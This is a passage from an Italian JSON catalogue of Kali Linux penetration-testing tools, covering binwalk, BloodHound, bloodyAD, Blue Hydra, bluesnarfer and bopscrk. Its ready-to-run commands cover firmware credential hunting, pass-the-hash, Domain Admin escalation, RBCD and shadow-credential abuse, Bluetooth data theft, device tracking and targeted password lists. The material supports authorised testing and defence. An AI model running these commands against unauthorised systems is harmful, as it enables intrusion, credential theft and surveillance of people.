~/.bettercap dopo engagement.</p><p><strong>Performance:</strong> Su reti grandi, ARP spoof di tutta la subnet può saturare la CPU. Limitare target quando possibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "binwalk",
    "name": "binwalk",
    "version": "2.4.3",
    "icon": "../app/icons/binwalk-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/binwalk/",
    "desc": "Analizza firmware ed estrae filesystem embedded, compressioni e file nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Binwalk</strong> è lo strumento standard de facto per l'analisi e l'estrazione di firmware, sviluppato da ReFirm Labs (ora parte di Microsoft). Scansiona file binari alla ricerca di oltre 500 signature note: header di filesystem (SquashFS, JFFS2, CramFS, YAFFS, UBI, ext2/3/4), algoritmi di compressione (gzip, LZMA, XZ, bzip2, LZO, Zstd), bootloader (U-Boot, ARM/MIPS bootstrap), certificati X.509, chiavi RSA/DSA, e formati proprietari. Estrae ricorsivamente tutti i componenti identificati, permettendo l'analisi completa di firmware per router, IoT, telecamere IP, automotive ECU, e qualsiasi embedded device.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature Scanning:</strong> Database magic bytes esteso per filesystem embedded, compressioni, bootloader, kernel Linux, certificati SSL, chiavi crypto. Customizzabile con .magic files.</p><p><strong>Recursive Extraction:</strong> Estrae automaticamente contenuti compressi e filesystem nested, seguendo ricorsivamente strutture embedded multi-livello (common in router firmware).</p><p><strong>Entropy Analysis:</strong> Visualizza grafico entropia del file per identificare sezioni cifrate (alta entropia costante) vs compresse (alta entropia variabile) vs plaintext (bassa entropia).</p><p><strong>Disassembly:</strong> Plugin opcode scanning per identificare architetture CPU (ARM, MIPS, x86, PPC) e entry point.</p><p><strong>Hex/Strings:</strong> Utility integrate per analisi manuale: hexdump, raw strings extraction, Unicode strings.</p><p><strong>Custom Signatures:</strong> Supporto per .magic file personalizzati per formati proprietari.</p><p><strong>Plugins:</strong> Architettura plugin estendibile per analisi specifiche (lzma decompressor, crypto detection, etc.).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ANALISI BASE ===\n# Scansione signature con output dettagliato\nbinwalk -B firmware.bin\n\n# Con verbose per vedere tutti i match\nbinwalk -Bv firmware.bin | tee analysis.txt\n\n# === ESTRAZIONE ===\n# Estrazione automatica (crea directory _firmware.bin.extracted/)\nbinwalk -e firmware.bin\n\n# Estrazione ricorsiva (estrae anche archivi dentro archivi)\nbinwalk -Me firmware.bin\n\n# Con privilegi root (necessario per alcuni filesystem)\nbinwalk -Me --run-as=root firmware.bin\n\n# Estrazione con offset specifico\nbinwalk --offset=0x40000 -e firmware.bin\n\n# === ENTROPY ANALYSIS ===\n# Genera grafico entropia (identifica cifratura)\nbinwalk -E firmware.bin\n\n# Salva grafico come PNG\nbinwalk -E --save firmware.bin\n\n# Con legenda dettagliata\nbinwalk -E --nplot firmware.bin  # Solo dati, no plot\n\n# === ESTRAZIONE SELETTIVA ===\n# Estrai solo filesystem specifico\nbinwalk --dd='squashfs:squashfs' firmware.bin\n\n# Estrai con handler custom (decompressione LZMA)\nbinwalk --dd='lzma compressed data:lzma:unlzma %e' firmware.bin\n\n# === COMPARISON ===\n# Diff tra due versioni firmware\nbinwalk -W firmware_v1.bin firmware_v2.bin\n\n# === CUSTOM MAGIC ===\n# Usa file magic personalizzato\nbinwalk --magic=/path/to/vendor.magic firmware.bin\n\n# === WORKFLOW COMPLETO IoT ANALYSIS ===\n# 1. Analisi iniziale\nbinwalk -Bv firmware.bin | tee initial_analysis.txt\n\n# 2. Check entropia (cifratura?)\nbinwalk -E --save firmware.bin\n\n# 3. Estrazione ricorsiva\nbinwalk -Me --run-as=root firmware.bin\n\n# 4. Cerca credenziali hardcoded\ncd _firmware.bin.extracted\nfind . -name \"*.conf\" -exec grep -l -i \"password\\|passwd\\|secret\" {} \\;\nfind . -name \"shadow\" -exec cat {} \\;\nfind . -name \"*.pem\" -o -name \"*.key\" | head\ngrep -r \"admin:\" .\ngrep -r \"root:\" .\n\n# 5. Identifica binari interessanti\nfind . -name \"*cgi*\" -o -name \"*httpd*\" -o -name \"*telnetd*\"\nfile $(find . -type f -executable) | grep -i \"arm\\|mips\"\n\n# 6. Estrai per reverse engineering\ncp ./squashfs-root/bin/vulnerable_binary /analysis/\n\n# === INTEGRAZIONE ===\n# Con firmwalker per analisi automatica\nfirmwalker.sh _firmware.bin.extracted/ report.txt\n\n# Con EMBA per vulnerability assessment\n./emba.sh -f firmware.bin -l ~/emba_logs</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>IoT Pentesting</strong>, primo passo obbligatorio: estrazione firmware per analizzare filesystem, credenziali hardcoded, certificati, e binari vulnerabili.</p><p>Per <strong>Vulnerability Research</strong>, permette di ottenere binari embedded (CGI, daemon, librerie) da analizzare con IDA Pro, Ghidra, o radare2.</p><p>In <strong>Supply Chain Security</strong>, verifica componenti third-party embedded, versioni librerie, e presenza di backdoor note.</p><p>Per <strong>CTF</strong>, le challenge firmware nascondono flag in filesystem, sezioni compresse, o binari modificati.</p><p>In <strong>Compliance Audit</strong>, verifica che firmware non contenga credenziali default, certificati scaduti, o componenti EOL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Firmware Cifrati:</strong> Vendor come TP-Link, Netgear usano XOR, AES o custom encryption. Richiede reverse engineering del bootloader/updater per chiavi.</p><p><strong>Signature Sconosciute:</strong> Formati proprietari non vengono riconosciuti. Analisi entropia + hex editor per identificare manualmente.</p><p><strong>Filesystem Corrotti:</strong> Estrazione può fallire su firmware parzialmente scaricati o corrotti. Verificare hash prima.</p><p><strong>Legal:</strong> In alcune giurisdizioni, reverse engineering firmware può violare DMCA/EUCD. Verificare termini di licenza.</p><p><strong>Dimensioni:</strong> Firmware grandi (>100MB) richiedono molto spazio per estrazione ricorsiva (10x+). Verificare spazio disponibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "bloodhound-kali",
    "name": "bloodhound",
    "version": "8.1.0",
    "icon": "../app/icons/bloodhound-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bloodhound/",
    "desc": "Visualizza relazioni in Active Directory per trovare path di privilege escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BloodHound</strong> rivoluziona l'analisi di Active Directory visualizzando le relazioni di trust, membership, ACL e permessi come un grafo navigabile con database Neo4j. Sviluppato da SpecterOps, utilizza la teoria dei grafi per calcolare automaticamente i percorsi di attacco più brevi da qualsiasi utente compromesso fino a Domain Admin, Enterprise Admin, o qualsiasi target definito. Trasforma giorni di analisi manuale in query istantanee, rivelando path di privilege escalation attraverso group membership, sessioni attive, deleghe Kerberos, ACL abusabili, GPO, certificati ADCS, e relazioni cross-domain che sarebbero impossibili da identificare manualmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Attack Path Analysis:</strong> Query pre-configurate per trovare shortest path verso DA, utenti Kerberoastable/AS-REProastable, deleghe pericolose (Unconstrained, Constrained, RBCD), ACL abusabili (GenericAll, WriteDACL, WriteOwner).</p><p><strong>Visual Graph Interface:</strong> Interfaccia grafica interattiva Neo4j-based che mostra nodi (User, Computer, Group, GPO, OU, Domain) e relazioni (MemberOf, AdminTo, HasSession, GenericAll, ecc.).</p><p><strong>Custom Cypher Queries:</strong> Supporto completo per query Cypher personalizzate per analisi specifiche dell'ambiente target.</p><p><strong>Multi-Domain Support:</strong> Analizza relazioni cross-domain e cross-forest per ambienti enterprise complessi.</p><p><strong>ADCS Integration:</strong> BloodHound 4.x+ include analisi di Active Directory Certificate Services per attacchi ESC1-ESC8.</p><p><strong>Azure AD Support:</strong> Con AzureHound, estende l'analisi a Entra ID e Azure RM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DATA COLLECTION - SHARPHOUND (Windows) ===\n# Collection completa (rumorosa)\nSharpHound.exe -c All --zipfilename bh_full.zip\n\n# Collection stealth - solo essenziale\nSharpHound.exe -c DCOnly,GPOLocalGroup --outputdirectory C:\\Temp --zipfilename bh.zip\n\n# Session loop - cattura sessioni nel tempo\nSharpHound.exe -c Session --Loop --Loopduration 02:00:00 --loopinterval 00:05:00\n\n# Exclude Domain Controllers (meno rumore)\nSharpHound.exe -c All --excludedcs\n\n# Domain specifico in ambiente multi-domain\nSharpHound.exe -c All -d child.domain.local\n\n# === DATA COLLECTION - BLOODHOUND-PYTHON (Linux) ===\n# Collection base\nbloodhound-python -d domain.local -u user -p 'Pass123!' -ns 10.0.0.1 -c All\n\n# Con output zip\nbloodhound-python -d domain.local -u user -p pass -c All --zip\n\n# Via SOCKS proxy (pivoting)\nproxychains bloodhound-python -d domain.local -u user -p pass -ns 10.0.0.1 -c All\n\n# Pass-the-Hash\nbloodhound-python -d domain.local -u admin --hashes aad3b435:31d6cfe0d16ae931 -ns dc01 -c All\n\n# Con Kerberos ticket (CCACHE)\nexport KRB5CCNAME=/tmp/krb5cc_user\nbloodhound-python -d domain.local -u user -k -c All\n\n# === IMPORT E ANALISI ===\n# Avvia BloodHound GUI\nbloodhound\n# o BloodHound CE (Community Edition) via Docker\n\n# Drag-and-drop file ZIP nella GUI\n# Database > Upload Data\n\n# === QUERY PRE-BUILT ===\n# Analysis > Pre-Built Analytics\n# - Find Shortest Paths to Domain Admins\n# - Find Kerberoastable Users\n# - Find AS-REP Roastable Users\n# - Find Computers with Unconstrained Delegation\n# - Shortest Path from Owned Principals\n\n# === CUSTOM CYPHER QUERIES ===\n# Shortest path da utente specifico a DA\nMATCH p=shortestPath((n:User {name:\"JSMITH@DOMAIN.LOCAL\"})-[*1..]->(m:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"}))\nRETURN p\n\n# Tutti i path verso DA (non solo shortest)\nMATCH p=(n:User)-[*1..5]->(m:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})\nRETURN p LIMIT 100\n\n# Kerberoastable users con path to DA\nMATCH (u:User {hasspn:true})\nMATCH p=shortestPath((u)-[*1..]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"}))\nRETURN u.name, LENGTH(p) as hops\nORDER BY hops\n\n# Utenti con DCSync rights\nMATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain)\nRETURN n.name\n\n# Computer con Unconstrained Delegation\nMATCH (c:Computer {unconstraineddelegation:true})\nRETURN c.name\n\n# ACL abusabili su Domain Admins\nMATCH (n)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})\nRETURN n.name, type(r)\n\n# === MARK OWNED / HIGH VALUE ===\n# Mark utente come compromesso\nMATCH (n:User {name:\"COMPROMISED@DOMAIN.LOCAL\"})\nSET n.owned=true\nRETURN n\n\n# Set starting point\nMATCH (n:User {name:\"JSMITH@DOMAIN.LOCAL\"})\nSET n.owned=true\nRETURN n\n\n# Mark high value target\nMATCH (n:Computer {name:\"SQLSERVER.DOMAIN.LOCAL\"})\nSET n.highvalue=true\nRETURN n</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>imprescindibile</strong> in ogni AD pentest - dopo l'accesso iniziale, BloodHound rivela immediatamente tutti i path verso Domain Admin.</p><p>Per <strong>Blue Team</strong>, identifica debolezze strutturali (ACL eccessivi, deleghe pericolose, utenti Kerberoastable) da correggere proattivamente.</p><p>In <strong>Threat Hunting</strong>, evidenzia account con privilegi eccessivi che potrebbero indicare compromissione.</p><p>Per <strong>Purple Team</strong>, valida che le correzioni abbiano effettivamente eliminato i path di attacco.</p><p>In <strong>Compliance/Audit</strong>, documenta la matrice di privilegi effettivi vs. intended.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Detection:</strong> SharpHound genera query LDAP intensive verso tutti i DC. Microsoft Defender for Identity rileva questo pattern come 'Reconnaissance using directory services queries'.</p><p><strong>SMB Sessions:</strong> Collection '-c Session' enumera sessioni via SMB su tutti i computer, generando traffico significativo e possibili alert.</p><p><strong>Stealth Collection:</strong> Usare '-c DCOnly' per limitare le query ai soli DC. Evitare '-c All' in ambienti monitorati.</p><p><strong>Time-Based:</strong> Session loop cattura sessioni admin che appaiono/scompaiono. Più collection = più copertura ma più rischio detection.</p><p><strong>Cleanup:</strong> I file ZIP contengono tutti i dati del dominio. Proteggere e cancellare dopo l'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "bloodyad",
    "name": "bloodyad",
    "version": "2.1.7",
    "icon": "../app/icons/bloodyad-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bloodyad/",
    "desc": "Tool AD per abusare ACL, deleghe, RBCD e modificare oggetti con privilegi minimi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BloodyAD</strong> è un tool Python per l'abuso di Active Directory che opera esclusivamente via LDAP/LDAPS, permettendo di sfruttare misconfigurazioni di ACL, deleghe Kerberos, e attributi AD senza richiedere privilegi elevati o accesso locale a Domain Controller. Sviluppato da CravateRouge, implementa le tecniche di privilege escalation più comuni identificate da BloodHound: abuso GenericAll/GenericWrite/WriteDACL, Resource-Based Constrained Delegation (RBCD), Shadow Credentials (msDS-KeyCredentialLink), password operations, e modifiche a gruppi/oggetti. È lo strumento ideale per exploitation AD da Linux attraverso tunnel o proxy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ACL Abuse:</strong> Sfrutta permessi eccessivi: GenericAll (full control), GenericWrite (modify attributes), WriteDACL (modify permissions), WriteOwner (take ownership), AddMember (add to groups).</p><p><strong>RBCD Attack:</strong> Configura msDS-AllowedToActOnBehalfOfOtherIdentity per Resource-Based Constrained Delegation, permettendo impersonation di utenti privilegiati.</p><p><strong>Shadow Credentials:</strong> Aggiunge msDS-KeyCredentialLink (certificato) a un account per ottenere TGT senza conoscere la password (richiede ADCS o chiave esistente).</p><p><strong>Password Operations:</strong> Reset password (ForceChangePassword), cambio password (Self permission), set password senza storico.</p><p><strong>Group Management:</strong> Aggiunta/rimozione membri da gruppi inclusi Domain Admins se si hanno i permessi.</p><p><strong>Object Modification:</strong> Modifica SPN (per Kerberoasting setup), UPN, servicePrincipalName, altri attributi.</p><p><strong>Computer Account:</strong> Crea machine account (default quota 10), imposta RBCD, gestisce msDS-ManagedPassword (gMSA).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AUTENTICAZIONE ===\n# Password\nbloodyAD -d domain.local -u user -p 'Pass123!' --host dc01.domain.local [comando]\n\n# Pass-the-Hash\nbloodyAD -d domain.local -u admin --hashes :31d6cfe0d16ae931 --host dc01 [comando]\n\n# Kerberos ticket\nexport KRB5CCNAME=/tmp/krb5cc_user\nbloodyAD -d domain.local -u user -k --host dc01 [comando]\n\n# Via proxy\nproxychains bloodyAD -d domain.local -u user -p pass --host dc01 [comando]\n\n# === ENUMERATION ===\n# Get info oggetto\nbloodyAD -d domain.local -u user -p pass --host dc01 get object 'CN=Target,CN=Users,DC=domain,DC=local'\n\n# Get membership\nbloodyAD -d domain.local -u user -p pass --host dc01 get membership targetuser\n\n# === ACL ABUSE ===\n# GenericAll -> Aggiungi a Domain Admins\nbloodyAD -d domain.local -u user -p pass --host dc01 add groupMember 'Domain Admins' targetuser\n\n# GenericAll/GenericWrite -> Reset password\nbloodyAD -d domain.local -u user -p pass --host dc01 set password targetuser 'NewP@ss123!'\n\n# WriteDACL -> Aggiungi GenericAll a te stesso\nbloodyAD -d domain.local -u user -p pass --host dc01 add genericAll 'CN=Target,DC=domain,DC=local' attackeruser\n\n# WriteOwner -> Prendi ownership poi WriteDACL\nbloodyAD -d domain.local -u user -p pass --host dc01 set owner 'CN=Target,DC=domain,DC=local' attackeruser\n\n# === RBCD ATTACK ===\n# 1. Crea computer account (se non ne hai uno)\nbloodyAD -d domain.local -u user -p pass --host dc01 add computer YOURPC$ 'Password123!'\n\n# 2. Imposta RBCD sul target (richiede GenericAll/GenericWrite su target computer)\nbloodyAD -d domain.local -u user -p pass --host dc01 add rbcd 'TARGETSERVER$' 'YOURPC$'\n\n# 3. Ora usa getST.py per impersonare admin\ngetST.py -spn cifs/TARGETSERVER.domain.local -impersonate Administrator domain.local/YOURPC$:'Password123!'\n\n# === SHADOW CREDENTIALS ===\n# Aggiungi KeyCredential (richiede GenericAll/GenericWrite)\nbloodyAD -d domain.local -u user -p pass --host dc01 add shadowCredentials targetuser\n\n# Output: certificato PFX\n# Usa per autenticazione:\ncertipy auth -pfx targetuser.pfx -domain domain.local\n\n# === COMPUTER ACCOUNT ===\n# Crea machine account\nbloodyAD -d domain.local -u user -p pass --host dc01 add computer YOURPC$ 'Password123!'\n\n# Set SPN (per Kerberoasting setup su account che controlli)\nbloodyAD -d domain.local -u user -p pass --host dc01 set object targetuser servicePrincipalName -v 'HTTP/fake.domain.local'\n\n# === CLEANUP ===\n# Rimuovi da gruppo\nbloodyAD -d domain.local -u user -p pass --host dc01 remove groupMember 'Domain Admins' targetuser\n\n# Rimuovi RBCD\nbloodyAD -d domain.local -u user -p pass --host dc01 remove rbcd 'TARGETSERVER$' 'YOURPC$'\n\n# Rimuovi Shadow Credentials\nbloodyAD -d domain.local -u user -p pass --host dc01 remove shadowCredentials targetuser</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando BloodHound identifica path ACL-based (es. 'User X ha GenericAll su User Y'), BloodyAD è lo strumento per sfruttarlo immediatamente.</p><p>Per <strong>RBCD attacks</strong>, è più pratico e veloce delle alternative PowerShell, specialmente da Linux.</p><p>Ideale per <strong>Linux-based AD pentesting</strong> senza necessità di accesso a macchina Windows joinata.</p><p>Per <strong>Shadow Credentials</strong> attack quando ADCS è presente ma non vulnerabile a ESC1-8.</p><p>In <strong>Assumed Breach</strong> scenarios, permette rapida escalation con credenziali low-priv.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Event Logging:</strong> Tutte le modifiche AD generano Event ID 5136 (Directory Service Changes). Modifiche a gruppi privilegiati triggherano alert in qualsiasi SIEM configurato.</p><p><strong>MDI Detection:</strong> Microsoft Defender for Identity rileva RBCD manipulation e Shadow Credentials come 'Suspected RBCD' attack.</p><p><strong>Rollback Essenziale:</strong> Sempre rimuovere le modifiche (RBCD, group membership, Shadow Credentials) al termine dell'engagement per evitare backdoor persistenti.</p><p><strong>Computer Account Quota:</strong> Default ms-DS-MachineAccountQuota è 10. Creare troppi account può essere notato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "blue-hydra",
    "name": "blue-hydra",
    "version": "1.9.20",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/blue-hydra/",
    "desc": "Rileva e monitora dispositivi Bluetooth classici e BLE nelle vicinanze.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Blue Hydra è un servizio di discovery Bluetooth progettato per monitoraggio continuo e tracking di dispositivi. A differenza di scanner semplici che mostrano solo dispositivi visibili al momento, Blue Hydra rileva simultaneamente Bluetooth Classic (BR/EDR) e Bluetooth Low Energy (BLE), mantenendo un database SQLite persistente con storico completo: timestamp primo/ultimo avvistamento, RSSI (potenza segnale per stima distanza), device class, servizi, manufacturer data. È progettato per deployment come sensore di sicurezza fisica o wireless monitoring station.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Mode Scanning:</strong> Rileva simultaneamente Bluetooth Classic (inquiry scan) e BLE (advertising scan) usando lo stesso adapter.</p><p><strong>Persistent Database:</strong> SQLite database con storico completo: device MAC, nome, classe, UUID servizi, primo/ultimo visto, conteggio osservazioni, RSSI medio.</p><p><strong>Device Fingerprinting:</strong> Raccoglie class of device (CoD), nome broadcast, servizi UUID, manufacturer specific data per identificare tipo dispositivo.</p><p><strong>MAC Tracking:</strong> Traccia dispositivi anche con MAC randomization parziale correlando altri attributi.</p><p><strong>Web Interface:</strong> Dashboard web real-time per visualizzare dispositivi attivi, storico, statistiche.</p><p><strong>API REST:</strong> Espone dati JSON per integrazione con SIEM, alerting, o altri sistemi di sicurezza.</p><p><strong>Ubertooth Support:</strong> Integrazione opzionale con Ubertooth One per capture avanzato e sniffing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO BASE ===\n# Avvio servizio (richiede adapter Bluetooth)\nsudo blue_hydra\n\n# Interfaccia web\n# Browser: http://localhost:8000\n\n# === CONFIGURAZIONE ===\n# Config file: /etc/blue_hydra/blue_hydra.yml\n# Opzioni principali:\nlog_level: info\nbt_device: hci0\nubertooth_device: /dev/ubertooth0  # se presente\ninfo_scan_rate: 60  # secondi tra scan\n\n# === QUERY DATABASE ===\n# Apri database SQLite\nsqlite3 /var/lib/blue_hydra/blue_hydra.db\n\n# Lista tutti i dispositivi\nSELECT address, name, classic_mode, le_mode, last_seen FROM blue_hydra_devices ORDER BY last_seen DESC;\n\n# Dispositivi visti nelle ultime 24h\nSELECT * FROM blue_hydra_devices WHERE last_seen > datetime('now', '-1 day');\n\n# Dispositivi per tipo (smartphone, PC, audio)\nSELECT address, name, classic_major_class, classic_minor_class FROM blue_hydra_devices WHERE classic_major_class = 'Phone';\n\n# Dispositivi BLE con servizi specifici\nSELECT address, name, le_service_uuids FROM blue_hydra_devices WHERE le_service_uuids LIKE '%180f%';  # Battery Service\n\n# Frequenza presenza (chi è sempre qui?)\nSELECT address, name, COUNT(*) as observations FROM blue_hydra_device_observations GROUP BY address ORDER BY observations DESC;\n\n# === ANALISI AVANZATA ===\n# Export per analisi esterna\nsqlite3 -header -csv /var/lib/blue_hydra/blue_hydra.db \"SELECT * FROM blue_hydra_devices;\" > devices.csv\n\n# Timeline presenza dispositivo specifico\nSELECT timestamp, rssi FROM blue_hydra_device_observations WHERE device_id = (SELECT id FROM blue_hydra_devices WHERE address = 'AA:BB:CC:DD:EE:FF');\n\n# === DAEMON MODE ===\n# Avvio come servizio systemd\nsudo systemctl enable blue_hydra\nsudo systemctl start blue_hydra\n\n# Log real-time\njournalctl -fu blue_hydra</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Security Assessment</strong>, monitora quali dispositivi Bluetooth (telefoni dipendenti, visitatori, dispositivi sconosciuti) sono presenti in un'area protetta nel tempo.</p><p>In <strong>Wireless Pentesting</strong>, enumera target BLE (dispositivi IoT, smartwatch, beacon) per successivi attacchi con bettercap o gatttool.</p><p>Per <strong>TSCM</strong> (Technical Surveillance Countermeasures), rileva dispositivi sospetti che potrebbero essere utilizzati per sorveglianza (microfoni BLE, tracker).</p><p>In <strong>Employee Tracking</strong> (con autorizzazione), analizza pattern di presenza basati sui dispositivi personali.</p><p>Per <strong>Retail Analytics</strong>, traccia flusso clienti basato su dispositivi Bluetooth visibili (con considerazioni privacy).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware Compatibility:</strong> Richiede adapter Bluetooth 4.0+ per BLE. Non tutti i dongle supportano scanning simultaneo Classic+BLE. CSR chipset raccomandato.</p><p><strong>MAC Randomization:</strong> iOS e Android moderni randomizzano MAC BLE in background. Tracking affidabile solo quando dispositivo è attivamente in uso o connesso.</p><p><strong>Legal Considerations:</strong> Il tracking di dispositivi personali può violare normative privacy (GDPR). Usare solo in contesti autorizzati.</p><p><strong>Range:</strong> Bluetooth ha range limitato (~10m indoor). Posizionamento strategico dei sensori per copertura.</p><p><strong>Resource Usage:</strong> Scanning continuo consuma risorse. Database può crescere significativamente in aree ad alto traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "bluesnarfer",
    "name": "bluesnarfer",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bluesnarfer/",
    "desc": "Sfrutta vulnerabilità Bluetooth per estrarre contatti e SMS da telefoni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bluesnarfer</strong> sfrutta la vulnerabilità 'Bluesnarf' (CVE-2004-2091) scoperta nel 2003-2004 che affliggeva telefoni Nokia, Sony Ericsson, Samsung e Motorola. La falla nel profilo OBEX Push permetteva di accedere ai dati del dispositivo (rubrica, SMS, calendario, IMEI) senza autenticazione o notifica all'utente. Sebbene i dispositivi moderni siano immuni, il tool rimane rilevante per testare dispositivi legacy in ambienti industriali, sanitari, automotive, e per scopi educativi sulla sicurezza Bluetooth.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Contact Extraction:</strong> Scarica rubrica completa (phonebook + SIM contacts) via OBEX senza autenticazione.</p><p><strong>SMS Access:</strong> Legge messaggi SMS dalla memoria del telefono e della SIM card (inbox, sent, drafts).</p><p><strong>Calendar/Notes:</strong> Accede a calendario, note, todo list e altri dati PIM esposti.</p><p><strong>IMEI Retrieval:</strong> Estrae l'identificativo univoco del dispositivo per tracking.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DISCOVERY ===\nhciconfig hci0 up\nhcitool scan  # Lista dispositivi visibili\n\n# === ATTACCO ===\n# Estrazione rubrica (entries 1-100)\nbluesnarfer -r 1-100 -b AA:BB:CC:DD:EE:FF\n\n# Lettura SMS inbox\nbluesnarfer -s SM -b AA:BB:CC:DD:EE:FF\n\n# Get IMEI\nbluesnarfer -i -b AA:BB:CC:DD:EE:FF\n\n# === VERIFICA ===\nsdptool browse AA:BB:CC:DD:EE:FF | grep -i OBEX</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Principalmente <strong>storico/didattico</strong> per comprendere l'evoluzione delle vulnerabilità Bluetooth.</p><p>In <strong>Legacy Testing</strong>, ancora rilevante per dispositivi in ambienti industriali (SCADA), sanitari, automotive con apparecchiature datate.</p><p>Per <strong>Security Training</strong>, dimostra l'importanza degli aggiornamenti e della sicurezza Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia Limitata:</strong> Dispositivi post-2006 con firmware aggiornato sono immuni. Richiede Bluetooth attivo e discoverable.</p><p><strong>Range:</strong> Bluetooth Class 2 ha range ~10m. Necessaria prossimità fisica.</p><p><strong>Legalità:</strong> L'accesso non autorizzato a dispositivi altrui è reato penale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "bopscrk",
    "name": "bopscrk",
    "version": "2.4.7",
    "icon": "../app/icons/bopscrk-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bopscrk/",
    "desc": "Genera wordlist personalizzate basate su info del target (nome, date, hobby).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BOPSCRK</strong> (Before Outset PaSsworCRacKing) genera wordlist personalizzate basate su informazioni OSINT raccolte sul target. Le persone creano password 'facili da ricordare' usando pattern prevedibili: nome+anno, cognome+data nascita, nome_pet+123, ecc. Inserendo dati personali (nome, cognome, date importanti, familiari, pet, hobby, azienda), BOPSCRK genera migliaia di combinazioni che riflettono questi pattern reali, aumentando drasticamente le probabilità di successo rispetto a dizionari generici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Personal Info Processing:</strong> Accetta nomi, cognomi, date (nascita, anniversario), familiari, pet, hobby, parole chiave custom e le combina intelligentemente.</p><p><strong>Leet Speak:</strong> Applica sostituzioni classiche: a→@, e→3, i→1, o→0, s→$, t→7.</p><p><strong>Case Variations:</strong> Genera variazioni: tutto minuscolo, tutto maiuscolo, Capitalizzato, cAMELcASE.</p><p><strong>Year/Number Suffixes:</strong> Aggiunge anni (1990-2024), numeri comuni (123, 1234, 321), date in vari formati.</p><p><strong>Special Characters:</strong> Append di simboli comuni: !, @, #, $, *, ., _</p><p><strong>Combination Depth:</strong> Configura quanto combinare le parole tra loro (depth 1-4).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === MODALITÀ INTERATTIVA ===\nbopscrk -i\n# Risponde alle domande su nome, cognome, date, familiari, etc.\n\n# === PARAMETRI DIRETTI ===\n# Esempio per target 'Mario Rossi' nato il 15/03/1985\nbopscrk -n mario -s rossi -b 15/03/1985 -o wordlist.txt\n\n# Con familiari e pet\nbopscrk -n mario -s rossi -b 15/03/1985 \\\n  --wife laura --child marco --child giulia \\\n  --pet fido --pet micio -o wordlist.txt\n\n# Con hobby e parole chiave\nbopscrk -n mario -s rossi \\\n  --hobby calcio --hobby inter \\\n  --words 'password,admin,milan' -o wordlist.txt\n\n# === CONFIGURAZIONE AVANZATA ===\n# Depth maggiore = più combinazioni\nbopscrk -n mario -s rossi --depth 3 -o wordlist.txt\n\n# Includi anni specifici\nbopscrk -n mario -s rossi --years 1985,2020,2023 -o wordlist.txt\n\n# Solo leet speak\nbopscrk -n mario -s rossi --leet -o wordlist.txt\n\n# === POST-PROCESSING ===\n# Rimuovi duplicati e ordina\nsort -u wordlist.txt > wordlist_clean.txt\n\n# Filtra per lunghezza (min 8, max 